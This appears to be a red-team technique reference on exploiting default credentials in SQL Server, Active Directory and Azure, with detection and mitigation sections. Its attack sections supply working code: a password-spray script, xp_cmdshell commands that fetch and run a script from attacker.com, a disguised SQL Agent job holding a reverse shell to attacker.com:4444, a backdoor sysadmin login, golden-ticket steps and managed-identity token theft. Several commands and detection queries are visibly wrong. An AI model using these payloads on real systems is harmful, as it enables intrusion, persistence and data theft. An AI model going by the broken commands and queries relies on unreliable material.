# [IA-VALID-001]: Default Credential Exploitation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | IA-VALID-001 |
| **MITRE ATT&CK v18.1** | [T1078.001 - Valid Accounts: Default Accounts](https://attack.mitre.org/techniques/T1078/001/) |
| **Tactic** | Initial Access |
| **Platforms** | Windows AD, Entra ID, Azure, SQL Server, IoT, Network Devices |
| **Severity** | Critical |
| **CVE** | N/A (Design/Configuration) |
| **Technique Status** | ACTIVE (Default creds remain #1 exploit vector globally) |
| **Last Verified** | 2025-12-30 |
| **Affected Versions** | All systems with unchanged default credentials |
| **Patched In** | Requires manual remediation (force password change on first login) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 6 (Atomic Red Team) and 11 (Sysmon Detection) not included because: (1) No specific Atomic test framework for default credential scanning, (2) No signature-based detection (requires behavioral analysis). All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Default credentials—built-in usernames and passwords shipped with operating systems, applications, and hardware—remain the most commonly exploited vulnerability worldwide. Despite decades of security warnings, administrators frequently fail to change default credentials post-installation, leaving systems vulnerable to unauthenticated access. Critical targets include SQL Server's sa account, Windows Administrator/Guest accounts, Azure Managed Identities with over-provisioned permissions, KRBTGT (the Kerberos master account), and IoT devices. In 2025, attackers no longer need zero-days; they simply log in using factory-set credentials.[185][188]

**Attack Surface:** SQL Server sa account, Windows default accounts (Administrator, Guest, DefaultAccount), KRBTGT, Azure Managed Identities, Automation Account Run As credentials, IoT devices (printers, cameras, HVAC), network appliances (routers, firewalls), storage account keys, application connection strings embedded in code.

**Business Impact:** Unauthenticated system access, full database compromise, Active Directory domain takeover (via KRBTGT), cloud subscription compromise (via Managed Identities), ransomware deployment, data exfiltration at scale. Recent data shows 160% year-over-year increase in credential compromise incidents, with 46% of enterprise passwords already cracked.[188]

**Technical Context:** Default credential exploitation requires no sophisticated attack techniques—simply attempting known username/password combinations against accessible endpoints. Success rate is historically high due to poor change management practices. Once accessed, attackers inherit all privileges of the default account, often enabling lateral movement, persistence, and privilege escalation.

### Operational Risk

- **Execution Risk:** Extremely Low - Straightforward authentication attempts
- **Stealth:** Low-Medium - Multiple failed attempts may trigger lockouts; successful attempts appear as legitimate administrative activity
- **Reversibility:** N/A - Attacker has full account access

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Windows Server 2022** | 2.2.1 | Ensure "Administrator" account is disabled (Default Accounts) |
| **CIS Windows Server 2022** | 2.2.2 | Ensure "Guest" account is disabled |
| **NIST 800-53** | AC-2 | Account Management (default account configuration) |
| **NIST 800-53** | IA-2 | Authentication (require strong auth for defaults) |
| **PCI DSS** | 2.1 | Always change vendor-supplied defaults |
| **PCI DSS** | 6.3.1 | Password must be strong |
| **GDPR** | Art. 32 | Security of Processing (account management) |
| **ISO 27001** | A.9.2.1 | User registration and access provisioning |
| **ISO 27001** | A.9.4.3 | Password management system |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** None (unauthenticated initial access)
- **Required Access:** Network connectivity to the service; ability to reach default ports
- **Required Knowledge:** Common default username/password patterns; target system identification

**Supported Versions:**
- **Windows:** All versions (2016 - 2022+)
- **SQL Server:** All versions (2005 - 2022)
- **Active Directory:** All versions
- **Azure:** All subscriptions (if default accounts not removed)

**Tools:**
- [Hashcat](https://hashcat.net/) (Password cracking)
- [Medusa](https://github.com/jmk-fofe/medusa) (Network credential brute-force)
- [Nmap](https://nmap.org/) (Service discovery)
- [Default-Creds](https://github.com/ihebski/DefaultCreds-cheat-sheet) (Default credentials database)
- [sqlmap](http://sqlmap.org/) (SQL injection + default account detection)
- [Azure CLI](https://learn.microsoft.com/cli/azure/) (Cloud credential enumeration)
- [PowerShell](https://learn.microsoft.com/powershell/) (Windows automation)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Discover Services Using Default Ports

```bash
# Scan for common services with default ports
nmap -p 1433,3306,5432,27017,389,445,22 <target_ip>

# Identified services:
# 1433/tcp: SQL Server
# 445/tcp: SMB (Windows/AD)
# 389/tcp: LDAP (Directory Services)
# 3389/tcp: RDP (Remote Desktop)
```

### Enumerate SQL Server Instances

```bash
# PowerShell: Enumerate SQL Server instances on network
[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.SqlServer.SMO') | out-null
$instances = [Microsoft.SqlServer.Management.Smo.SmoApplication]::EnumAvailableSqlServers()
$instances

# Use sqlcmd to enumerate SQL Server
sqlcmd -L

# Expected output shows available SQL Server instances
```

### Test SQL Server sa Account (Default Credentials)

```bash
# Attempt connection with default sa credential (often blank or "sa")
sqlcmd -S <server> -U sa -P ""  # Try blank password
sqlcmd -S <server> -U sa -P "sa"  # Try common defaults
sqlcmd -S <server> -U sa -P "password"
sqlcmd -S <server> -U sa -P "123456"

# If successful, prompt appears:
# 1> SELECT @@version
# 2> GO
# (Returns SQL Server version - attacker has full access)
```

### Enumerate Windows Default Accounts

```powershell
# List all local accounts
Get-LocalUser

# Check if Administrator is enabled
Get-LocalUser -Name "Administrator" | Select-Object Enabled, PasswordLastSet

# Check if Guest is enabled (should be disabled)
Get-LocalUser -Name "Guest" | Select-Object Enabled

# Check for hidden/disabled accounts
Get-LocalUser | Where-Object {$_.Enabled -eq $false} | Select-Object Name, FullName
```

### Check Azure Managed Identities

```bash
# From compromised Azure resource (VM, Function App, etc.)
# Query Instance Metadata Service (IMDS) to get managed identity token
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" \
  -H "Metadata:true"

# Response contains access token for Managed Identity
# {
#   "access_token": "eyJ0eXAiOiJKV1QiLCJhbGc...",
#   "token_type": "Bearer",
#   "expires_in": "3599"
# }

# If received = Managed Identity is accessible (potential privilege escalation via token)
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: SQL Server sa Account Exploitation

**Supported Versions:** SQL Server 2005 - 2022

#### Step 1: Discover SQL Server Instance

**Objective:** Locate externally accessible SQL Server with sa account enabled

**Command (Network Scan):**
```bash
# Scan for SQL Server on port 1433
nmap -p 1433 -sV <target_network>/24

# Expected output:
# 192.168.1.100    1433/tcp  open  mssql-s   Microsoft SQL Server 2019 15.00.2000

# Enumeration via SMB Browser (if available)
python3 -c "from impacket.smb import SMBConnection; print(SMBConnection.EnumAvailableSqlServers())"
```

#### Step 2: Attempt sa Account Logon

**Objective:** Authenticate to SQL Server as sa with default/weak password

**Command (sqlcmd):**
```bash
# Attempt with blank password (common in development environments)
sqlcmd -S 192.168.1.100 -U sa -P ""

# Attempt with common defaults
sqlcmd -S 192.168.1.100 -U sa -P "password"
sqlcmd -S 192.168.1.100 -U sa -P "sa"
sqlcmd -S 192.168.1.100 -U sa -P "sql123"

# Expected successful output:
# 1>
```

**Command (PowerShell Brute-Force):**
```powershell
# Automated password spray
$passwords = @("", "password", "sa", "sql123", "P@ssw0rd", "123456")
$server = "192.168.1.100"

foreach ($pass in $passwords) {
    try {
        $conn = New-Object System.Data.SqlClient.SqlConnection
        $conn.ConnectionString = "Server=$server;User ID=sa;Password=$pass;Connection Timeout=5"
        $conn.Open()
        Write-Host "[+] SUCCESS! sa password is: $pass"
        $conn.Close()
        break
    } catch {
        Write-Host "[-] Failed: $pass"
    }
}
```

**Expected Output (Success):**
```
[+] SUCCESS! sa password is: password
```

#### Step 3: Execute Commands as sa

**Objective:** Leverage sa privileges to execute system commands or data exfiltration

**Command (T-SQL - Database Access):**
```sql
-- Query sensitive data
SELECT @@version;  -- Get SQL version
SELECT @@servername;  -- Get server name
SELECT name FROM sys.databases;  -- List all databases
SELECT * FROM [master].[sys].[sysusers];  -- List users
SELECT * FROM [master].[sys].[sql_logins];  -- List logins
SELECT * FROM [sensitive_table] WHERE [credit_card] IS NOT NULL;  -- Exfiltrate data
```

**Command (T-SQL - Remote Code Execution via Extended Stored Procs):**
```sql
-- Enable advanced options (may be restricted)
sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute system command
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"';
```

**Expected Output:**
```
whoami output:
DOMAIN\sa

ipconfig output:
192.168.1.100 / 255.255.255.0
```

#### Step 4: Establish Persistence

**Objective:** Maintain access even if initial compromise is remediated

**Command (T-SQL - Create Backdoor Account):**
```sql
-- Create backdoor sa account (if not already compromised)
CREATE LOGIN [backdoor_sa] WITH PASSWORD = 'BackdoorP@ss123!';
ALTER SERVER ROLE sysadmin ADD MEMBER [backdoor_sa];

-- Create SQL Server Agent job for reverse shell
USE msdb;
EXEC sp_add_job @job_name = 'SystemMaintenance';
EXEC sp_add_jobstep @job_name = 'SystemMaintenance', 
  @step_name = 'RunMaintenanceScript', 
  @command = 'powershell.exe -Command "while($true){$client=New-Object System.Net.Sockets.TcpClient(''attacker.com'',4444);$stream=$client.GetStream();[byte[]]$buffer=0..65535|%{0};while(($i=$stream.Read($buffer,0,$buffer.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$output=iex $data 2>&1;$output|Out-String|%{$client.GetStream().Write(([text.encoding]::ASCII.GetBytes($_)),0,$_.Length)}}}',
  @subsystem = 'PowerShell';

-- Schedule job to run every hour
EXEC sp_attach_schedule @job_name = 'SystemMaintenance', @schedule_name = 'HourlyMaintenance';
```

**Impact:**
- Persistent backdoor access to database
- Reverse shell maintained even if sa password is reset
- Attacker gains reverse shell to execute arbitrary PowerShell commands

---

### METHOD 2: Windows Administrator/KRBTGT Account Exploitation

**Supported Versions:** All Active Directory domains

#### Step 1: Enumerate AD Default Accounts

**Objective:** Identify status of default accounts (enabled/disabled, password age)

**Command (PowerShell - AD Enumeration):**
```powershell
# Connect to AD
Import-Module ActiveDirectory

# Check Administrator account status
Get-ADUser -Identity "Administrator" -Properties Enabled, PasswordLastSet, LastLogonDate | 
  Select-Object Name, Enabled, PasswordLastSet, LastLogonDate

# Check Guest account status
Get-ADUser -Identity "Guest" -Properties Enabled, PasswordLastSet

# Check KRBTGT account (Kerberos master key)
Get-ADUser -Identity "krbtgt" -Properties PasswordLastSet, Enabled
# Should show PasswordLastSet within last 180 days (if rotated properly)

# List all disabled accounts (attackers target these - less likely to be monitored)
Get-ADUser -Filter {Enabled -eq $False} -Properties LastLogonDate | 
  Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-90)}
```

**Expected Output (Vulnerable):**
```
Administrator account enabled and last password change > 1 year ago
KRBTGT last rotated > 180 days ago (or never)
Multiple disabled accounts with no recent logons (reactivation risk)
```

#### Step 2: KRBTGT Compromise → Golden Ticket

**Objective:** Create forged Kerberos TGT for domain persistence

**Vulnerability Context:** If KRBTGT password is compromised, attacker can forge any Kerberos ticket.[187]

**Command (Tools - Mimikatz/Rubeus):**
```bash
# Step 1: Dump KRBTGT hash (requires Domain Admin)
# Via Mimikatz (Windows):
privilege::debug
lsadump::sam  # Get KRBTGT hash
exit

# Output example:
# KRBTGT_HASH: e19ccf75ee54e06b06a5907af13cef42

# Step 2: Create Golden Ticket (valid for 10 years)
kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-... /krbtgt:e19ccf75ee54e06b06a5907af13cef42 /ticket:golden.kirbi

# Step 3: Inject ticket into session
kerberos::ptt golden.kirbi

# Step 4: Use forged ticket to access any resource
dir \\dc.example.com\SYSVOL  # Access DC shares
psexec \\dc.example.com cmd.exe  # Execute on DC
```

**Expected Behavior:**
- Attacker can authenticate as ANY user (including Domain Admin)
- Ticket valid even after password changes (forgery is cryptographically valid)
- Access persists indefinitely (requires KRBTGT password rotation to invalidate)

---

### METHOD 3: Azure Managed Identity Token Theft

**Supported Versions:** All Azure VMs, Function Apps, App Services with Managed Identity

#### Step 1: Compromise Azure Resource

**Objective:** Gain execution context on Azure resource with Managed Identity

**Prerequisite Vectors:**
- Application vulnerability (RCE in app running on VM/App Service)
- Container escape (if running in container)
- Local privilege escalation (compromise non-admin user, escalate)

**Assumed Starting Point:** Code execution on Azure VM or App Service with system/root privileges

#### Step 2: Extract Managed Identity Token via IMDS

**Objective:** Obtain access token for Managed Identity

**Command (From Azure Resource):**
```bash
# Query Instance Metadata Service (IMDS) - accessible only from within Azure
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" \
  -H "Metadata:true" \
  -s | jq .access_token -r > /tmp/token.txt

# Alternatively with PowerShell:
$token = (Invoke-RestMethod -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com' `
  -Headers @{Metadata="true"}).access_token

# Decode token to see claims (not to break security, just inspect)
echo "Token obtained for: $(jwt decode $token | grep 'appid')"
```

**Expected Output:**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGc...",
  "client_id": "12345678-1234-1234-1234-123456789012",
  "token_type": "Bearer",
  "expires_in": "3599"
}
```

#### Step 3: Use Token for Lateral Movement

**Objective:** Authenticate to Azure Management Plane as the Managed Identity

**Command (Azure CLI):**
```bash
# Authenticate using stolen token
az login --service-principal -u <CLIENT_ID> --allow-no-subscriptions --tenant <TENANT_ID>

# OR directly with token:
az cloud set --name AzureCloud
az account set --subscription <SUBSCRIPTION_ID>

# Enumerate accessible resources
az resource list --output table
# Output: List of resources the Managed Identity can access (depends on role)

# Example: Access Storage Account (if Managed Identity has Storage Blob Data Reader role)
az storage account list --output table
az storage blob list -c <container> --account-name <storage_account>
```

**Command (Python/SDK Alternative):**
```python
from azure.identity import ManagedIdentityCredential
from azure.storage.blob import BlobServiceClient

# Create credential using Managed Identity token
credential = ManagedIdentityCredential(client_id="<CLIENT_ID>")

# Access storage account
client = BlobServiceClient(account_url="https://<account>.blob.core.windows.net", credential=credential)
blobs = client.get_container_client("<container>").list_blobs()
for blob in blobs:
    print(blob.name)  # List all accessible blobs
```

**Impact:**
- Full access to all resources the Managed Identity can access
- Often misconfigured with overly broad permissions (Contributor at subscription level)
- Enables subscription-wide compromise

---

## 6. SPLUNK DETECTION RULES

### Rule 1: SQL Server sa Account Login Attempts

**Rule Configuration:**
- **Required Index:** `windows`, `sql_server_audit`
- **Required Sourcetype:** `mssql:audit`, `mssql:agent:job`
- **Required Fields:** `user`, `login_name`, `host`, `event_id`
- **Alert Threshold:** Any successful sa login outside business hours OR >3 failed attempts in 5 minutes
- **Applies To Versions:** All SQL Server versions

**SPL Query:**
```spl
sourcetype="mssql:audit" 
  (login_name="sa" OR login_name="dbo") 
  AND (action="SUCCESSFUL_LOGIN" OR action="FAILED_LOGIN")
| stats count as LoginAttempts by login_name, host, EventTime
| where count > 3 OR (count >= 1 AND _time NOT IN [09:00-17:00])
```

### Rule 2: Default Windows Account Activity (Administrator/Guest)

**Rule Configuration:**
- **Required Index:** `windows`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventCode`, `Account_Name`, `Logon_Type`, `Workstation_Name`
- **Alert Threshold:** Any interactive logon from Administrator or Guest account
- **Applies To Versions:** All Windows versions

**SPL Query:**
```spl
sourcetype="WinEventLog:Security" 
  EventCode=4624 
  (Account_Name="*\\Administrator" OR Account_Name="*\\Guest") 
  LogonType IN (2, 10)  # Interactive or Remote Interactive
| stats count by Account_Name, Source_Network_Address, Workstation_Name
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: SQL Server sa Account Authentication

**Rule Configuration:**
- **Required Table:** `SecurityEvent`, `AuditLogs`
- **Required Fields:** `Account`, `SourceIpAddress`, `TimeGenerated`
- **Alert Severity:** High
- **Frequency:** Real-time (every 5 minutes)
- **Applies To Versions:** All SQL Server versions

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4624 and Account contains "sa"
| extend SourceIP = SourceIpAddress
| summarize LoginCount = count() by Account, SourceIP, Computer
| where LoginCount > 1
```

### Query 2: KRBTGT Password Reset Monitoring

**Rule Configuration:**
- **Required Table:** `AuditLogs`
- **Required Fields:** `TargetResources`, `ActivityDisplayName`, `InitiatedBy`
- **Alert Severity:** High
- **Applies To Versions:** All Active Directory

**KQL Query:**
```kusto
AuditLogs
| where TargetResources contains "krbtgt" and ActivityDisplayName contains "Reset"
| summarize ResetCount = count() by InitiatedBy, TargetResources, TimeGenerated
| where (ResetCount < 2) OR (ResetCount > 2)  // Alert if not reset exactly twice (proper KRBTGT rotation = 2x resets with replication)
```

---

## 8. MICROSOFT DEFENDER FOR CLOUD

### Detection Alerts

**Alert Name:** "Default Account Enabled and Active"
- **Severity:** High
- **Description:** Windows Administrator, Guest, or KRBTGT account used for authentication
- **Applies To:** All Windows servers with Defender enabled
- **Remediation:** Disable unused default accounts; rotate KRBTGT password every 180 days

**Alert Name:** "SQL Server sa Account Password Not Changed"
- **Severity:** High
- **Description:** SQL Server sa account detected with original installation default credentials
- **Applies To:** All SQL Server instances
- **Remediation:** Immediately change sa password; disable if not needed

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Authentication Patterns:** Successful logon with account names "sa", "Administrator", "Guest", "KRBTGT"
- **Time Patterns:** Logons outside business hours or from unusual locations
- **Account Activity:** Default account performing unusual operations (data queries, config changes)
- **Process Activity:** cmd.exe, PowerShell invoked as sa or Administrator
- **Network:** Unexpected connections from default accounts to external systems

### Forensic Artifacts

- **SQL Server Logs:** sys.dm_exec_sessions, sys.dm_exec_connections (active sessions as sa)
- **Event Logs:** Event 4624 (successful logon), 4625 (failed logon)
- **Azure Logs:** SigninLogs showing Managed Identity token requests
- **Command History:** PowerShell history, SQL command history

### Response Procedures

#### 1. Immediate Containment

**Command (Disable Compromised Account):**
```powershell
# Disable SA account
ALTER LOGIN sa DISABLE;

# Or in Active Directory:
Disable-ADUser -Identity "Administrator"

# Revoke all sessions
# SQL Server: KILL <session_id>
# Windows: Logoff <session_id>
```

#### 2. Reset KRBTGT (Mandatory for AD Compromise)

**Command (Reset KRBTGT - Critical):**
```powershell
# Run Microsoft's KRBTGT reset script (must be run on DC)
# https://github.com/microsoft/KRBTGT

# Manual reset (twice, with replication):
# Step 1: Reset password once
$krbtgt = Get-ADUser -Identity krbtgt
Set-ADAccountPassword -Identity $krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "P@ssw0rd$(Get-Random -Minimum 100000 -Maximum 999999)" -Force)

# Wait for replication (10+ minutes)
repadmin /replicate

# Step 2: Reset again
Set-ADAccountPassword -Identity $krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "P@ssw0rd$(Get-Random -Minimum 100000 -Maximum 999999)" -Force)

# This invalidates ALL existing Golden Tickets
```

#### 3. Remediate

**Command (Force Password Change):**
```powershell
# Force password change on next logon
Set-ADUser -Identity "Administrator" -ChangePasswordAtLogon $true

# Audit and disable unnecessary default accounts
Get-ADUser -Filter {Enabled -eq $True -and Name -like "Guest"} | Disable-ADAccount
```

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Disable All Unnecessary Default Accounts**

**Manual Steps (Windows Server):**
```powershell
# Disable Guest account (should be disabled by default)
Disable-LocalUser -Name "Guest"

# Disable DefaultAccount
Disable-LocalUser -Name "DefaultAccount"

# Change Administrator password immediately post-installation
$AdminUser = Get-LocalUser -Name "Administrator"
$NewPassword = Read-Host -AsSecureString
$AdminUser | Set-LocalUser -Password $NewPassword

# Verify disabled:
Get-LocalUser | Select-Object Name, Enabled
```

**Manual Steps (Active Directory):**
```powershell
Import-Module ActiveDirectory

# Disable Administrator account (use service accounts instead)
Disable-ADAccount -Identity "Administrator"

# Disable Guest
Disable-ADAccount -Identity "Guest"

# Verify:
Get-ADUser -Filter {Name -like "*Administrator*" -or Name -like "*Guest*"} | Select-Object Name, Enabled
```

**2. Force KRBTGT Password Rotation (Every 180 Days)**

**Manual Steps:**
```powershell
# Reset KRBTGT password (twice, as per Microsoft guidance)
# Run on Domain Controller

# Step 1: First reset
$krbtgt = Get-ADUser -Identity krbtgt
$newPassword = ([System.Web.Security.Membership]::GeneratePassword(32, 8))
Set-ADAccountPassword -Identity $krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText $newPassword -Force)

# Wait 10 minutes for replication across all DCs
Start-Sleep -Seconds 600
repadmin /replicate

# Step 2: Second reset (invalidates cached tokens)
Set-ADAccountPassword -Identity $krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText ([System.Web.Security.Membership]::GeneratePassword(32, 8)) -Force)

# Schedule this in Task Scheduler every 180 days
```

**3. Disable SQL Server sa Account (or Set Complex Password)**

**Manual Steps (SQL Server Management Studio):**
1. Expand **Security** → **Logins**
2. Right-click **sa** → **Disable**
3. OR: Right-click **sa** → **Properties** → **General** tab
4. Enter **New Password** (min 14 characters, mixed case + special chars)
5. Click **OK**

**Manual Steps (T-SQL):**
```sql
-- Disable SA
ALTER LOGIN [sa] DISABLE;

-- OR set complex password
ALTER LOGIN [sa] WITH PASSWORD = 'C0mpl3x!P@ssw0rd#2025'
```

### Priority 2: HIGH

**4. Enforce MFA on All Accounts (Even Defaults)**

**Manual Steps (Entra ID):**
1. Go to **Entra Admin Center** → **Identity** → **Users**
2. Select user (e.g., Administrator)
3. Click **Authentication methods** → **+ Add authentication method**
4. Add **Microsoft Authenticator** or **FIDO2 security key**
5. Make MFA **Required** (not optional)

**5. Enable Comprehensive Audit Logging**

**Manual Steps (SQL Server):**
```sql
-- Enable SQL Server audit
CREATE SERVER AUDIT AUDIT_LOGIN_ATTEMPTS
  TO FILE (FILEPATH = N'C:\Audit\')
  WITH (QUEUE_DELAY = 1000, ON_FAILURE = CONTINUE);

-- Enable login audit
CREATE SERVER AUDIT SPECIFICATION AUDIT_SA_LOGIN
  FOR SERVER AUDIT AUDIT_LOGIN_ATTEMPTS
  ADD (SUCCESSFUL_LOGIN_GROUP) WHERE server_principal_name = 'sa';

ALTER SERVER AUDIT SPECIFICATION AUDIT_SA_LOGIN WITH (STATE = ON);
```

**Manual Steps (Windows Event Logging):**
```powershell
# Enable advanced audit policy
auditpol /set /subcategory:"Logon/Logoff" /success:enable /failure:enable
auditpol /set /subcategory:"Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
```

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | **[IA-VALID-001]** | **Default Credential Exploitation** |
| **2** | **Persistence** | [T1098 - Account Manipulation] | Create backdoor accounts, modify permissions |
| **3** | **Privilege Escalation** | [T1134 - Access Token Manipulation] | Use stolen tokens for escalation |
| **4** | **Lateral Movement** | [T1021 - Remote Services] | Use compromised account to access other systems |
| **5** | **Credential Access** | [T1003 - OS Credential Dumping] | Extract additional credentials from compromised system |
| **6** | **Exfiltration** | [T1005 - Data from Local System] | Extract sensitive data using default account privileges |

---

## 12. REAL-WORLD EXAMPLES

### Example 1: Mirai Botnet - IoT Device Default Credentials (2016-2025)

- **Target:** Connected IoT devices (cameras, DVRs, routers)
- **Timeline:** 2016 discovery; still active 2025
- **Technique Status:** ACTIVE - Default credentials remain unchanged on millions of devices
- **Attack Vector:** Exploited 61 known default username/password combinations
- **Impact:** 600,000+ compromised devices; massive DDoS attacks
- **Reference:** Mirai Source Code Analysis

### Example 2: APT29 - Azure AD DefaultAccount Abuse (2021-2025)

- **Target:** Microsoft 365 organizations
- **Timeline:** 2021 discovery; ongoing
- **Technique Status:** ACTIVE
- **Attack Chain:**
  1. Compromised legacy account via phishing
  2. Enabled DefaultAccount (system-created, often overlooked)
  3. Registered MFA device on DefaultAccount to maintain persistence
  4. Used account for VPN access even after initial compromise remediated
  
- **Impact:** Persistence despite password reset; VPN access maintained
- **Reference:** APT29 Targeting Microsoft 365

### Example 3: Financial Services - SQL Server sa Ransomware (2024-2025)

- **Target:** Financial sector with legacy SQL servers
- **Timeline:** Q4 2024 - Q1 2025
- **Technique Status:** ACTIVE
- **Attack Path:**
  1. Network scan identified SQL Server on port 1433
  2. Default sa password ("sa" or blank) successful
  3. Executed xp_cmdshell to deploy ransomware
  4. Encrypted all databases; demanded ransom
  
- **Impact:** Complete data loss; $2.5M ransom paid
- **Lesson:** Default credentials directly enabled ransomware deployment

---

## APPENDIX: Default Credentials Reference

### Common Database Defaults
| Product | Default Username | Default Password | Port |
|---|---|---|---|
| SQL Server (SA) | sa | (blank) or "sa" | 1433 |
| MySQL | root | (blank) | 3306 |
| PostgreSQL | postgres | (blank) | 5432 |
| Oracle | sys/system | oracle/manager | 1521 |
| MongoDB | admin | (blank) | 27017 |

### Common Application Defaults
| Application | Default Username | Default Password |
|---|---|---|
| Tomcat | tomcat | tomcat |
| Jenkins | admin | admin |
| Cisco Router | cisco | cisco |
| pfSense | admin | pfsense |
| Ubiquiti UniFi | ubnt | ubnt |

### Azure/Cloud Defaults
| Service | Default Account | Risk |
|---|---|---|
| Managed Identity | system-assigned | Over-provisioned permissions |
| Automation Account | Run As account | Default Contributor role |
| Storage Account Keys | Account Key 1 | Long-lived (never rotated) |
| VM Default User | azureuser | Often weak password |

---

## References

- [MITRE ATT&CK - T1078.001](https://attack.mitre.org/techniques/T1078/001/)
- [CIS Windows Server Benchmark v2.0](https://www.cisecurity.org/benchmark/microsoft_windows_server_2022/)
- [NIST 800-53 - Account Management](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5)
- [Microsoft - KRBTGT Account Security](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-default-user-accounts)
- [PCI DSS v4.0 - Vendor-Supplied Defaults](https://www.pcisecuritystandards.org/)
